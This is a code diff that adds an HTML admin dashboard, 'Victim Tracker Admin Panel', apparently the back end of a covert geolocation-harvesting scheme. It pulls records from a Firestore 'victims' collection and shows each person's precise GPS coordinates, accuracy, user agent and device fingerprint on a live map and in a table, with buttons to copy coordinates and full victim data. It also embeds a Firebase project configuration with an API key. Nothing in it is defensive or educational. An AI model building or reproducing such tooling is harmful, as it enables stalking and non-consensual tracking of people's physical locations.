@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Victim Tracker</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #fff; }
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header h1 { color: #00ff88; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .stat-card { background: #2a2a2a; padding: 20px; border-radius: 10px; text-align: center; }
+        .stat-number { font-size: 2em; color: #00ff88; font-weight: bold; }
+        .map-container { height: 500px; background: #333; border-radius: 10px; margin-bottom: 30px; overflow: hidden; }
+        .victims-table { background: #2a2a2a; border-radius: 10px; overflow: hidden; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 15px; text-align: left; border-bottom: 1px solid #444; }
+        th { background: #00ff88; color: #000; font-weight: bold; }
+        .latlon { cursor: pointer; color: #00ff88; }
+        .latlon:hover { text-decoration: underline; }
+        .copy-btn { background: #00ff88; color: #000; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; margin-left: 10px; }
+        #map { height: 100%; width: 100%; }
+        .live-badge { background: #ff4444; color: white; padding: 3px 8px; border-radius: 20px; font-size: 0.8em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🕵️ Victim Tracker Admin Panel</h1>
+            <p>Real-time geolocation tracking dashboard</p>
+        </div>
+
+        <div class="stats" id="stats">
+            <!-- Stats will be populated by JS -->
+        </div>
+
+        <div class="map-container">
+            <div id="map"></div>
+        </div>
+
+        <div class="victims-table">
+            <table id="victimsTable">
+                <thead>
+                    <tr>
+                        <th>Session ID</th>
+                        <th>Location</th>
+                        <th>Accuracy</th>
+                        <th>IP/UserAgent</th>
+                        <th>Time</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="victimsBody"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Firebase + Leaflet -->
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
+        import { getFirestore, collection, query, orderBy, limit, onSnapshot } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js';
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDNAcbechPRfrWSpxkZHKsksnr_hS88XdU",
+            authDomain: "ai-studio-applet-webapp-2b6f9.firebaseapp.com",
+            databaseURL: "https://ai-studio-applet-webapp-2b6f9-default-rtdb.firebaseio.com",
+            projectId: "ai-studio-applet-webapp-2b6f9",
+            storageBucket: "ai-studio-applet-webapp-2b6f9.firebasestorage.app",
+            messagingSenderId: "594142136198",
+            appId: "1:594142136198:web:2cd1ff68a43efefebd0e07"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Initialize Leaflet map
+        const map = L.map('map').setView([0, 0], 2);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '© OpenStreetMap contributors'
+        }).addTo(map);
+
+        let markers = [];
+        let victimCount = 0;
+
+        // Real-time listener for victims
+        const q = query(collection(db, "victims"), orderBy('timestamp', 'desc'), limit(100));
+        onSnapshot(q, (snapshot) => {
+            const victims = [];
+            snapshot.docs.forEach((doc) => {
+                victims.push({ id: doc.id, ...doc.data() });
+            });
+
+            updateStats(victims);
+            updateTable(victims);
+            updateMap(victims);
+            victimCount = victims.length;
+        });
+
+        function updateStats(victims) {
+            const statsDiv = document.getElementById('stats');
+            statsDiv.innerHTML = `
+                <div class="stat-card">
+                    <div class="stat-number">${victimCount}</div>
+                    <div>Total Victims</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">${Math.round(victims.filter(v => v.latitude).length)}</div>
+                    <div>With GPS</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">${new Date().toLocaleTimeString()}</div>
+                    <div>Last Update</div>
+                </div>
+            `;
+        }
+
+        function updateTable(victims) {
+            const tbody = document.getElementById('victimsBody');
+            tbody.innerHTML = victims.map(victim => `
+                <tr>
+                    <td>${victim.sessionId?.substring(0, 12)}...</td>
+                    <td>
+                        <span class="latlon" onclick="openGoogleMaps(${victim.latitude || 0}, ${victim.longitude || 0})">
+                            ${victim.latitude?.toFixed(6) || 'N/A'}, ${victim.longitude?.toFixed(6) || 'N/A'}
+                        </span>
+                        ${victim.accuracy ? `<span style="font-size: 0.8em; color: #888;">±${Math.round(victim.accuracy)}m</span>` : ''}
+                    </td>
+                    <td>${victim.accuracy ? Math.round(victim.accuracy) + 'm' : 'N/A'}</td>
+                    <td>${victim.fingerprint?.userAgent?.substring(0, 50)}...</td>
+                    <td>${victim.timestamp ? new Date(victim.timestamp.seconds * 1000).toLocaleString() : 'N/A'}</td>
+                    <td>
+                        <button class="copy-btn" onclick="copyCoords('${victim.latitude || ''}', '${victim.longitude || ''}')">Copy</button>
+                        <button class="copy-btn" onclick="copyJSON(${JSON.stringify(victim).replace(/"/g, '&quot;')})">JSON</button>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        function updateMap(victims) {
+            // Clear existing markers
+            markers.forEach(marker => map.removeLayer(marker));
+            markers = [];
+
+            victims.forEach(victim => {
+                if (victim.latitude && victim.longitude) {
+                    const marker = L.marker([victim.latitude, victim.longitude])
+                        .addTo(map)
+                        .bindPopup(`
+                            <b>${victim.sessionId?.substring(0, 12)}...</b><br>
+                            ${victim.latitude.toFixed(6)}, ${victim.longitude.toFixed(6)}<br>
+                            ±${Math.round(victim.accuracy || 0)}m<br>
+                            <small>${new Date(victim.timestamp.seconds * 1000).toLocaleString()}</small>
+                        `);
+                    markers.push(marker);
+
+                    // Auto-fit map to show all markers
+                    map.fitBounds(markers.map(m => m.getLatLng()), { padding: [20, 20] });
+                }
+            });
+        }
+
+        // Utility functions
+        window.openGoogleMaps = (lat, lng) => {
+            window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
+        };
+
+        window.copyCoords = (lat, lng) => {
+            navigator.clipboard.writeText(`${lat}, ${lng}`);
+            alert('Coordinates copied!');
+        };
+
+        window.copyJSON = (json) => {
+            navigator.clipboard.writeText(json);
+            alert('Full victim data copied!');
+        };
+    </script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+</body>
+</html>
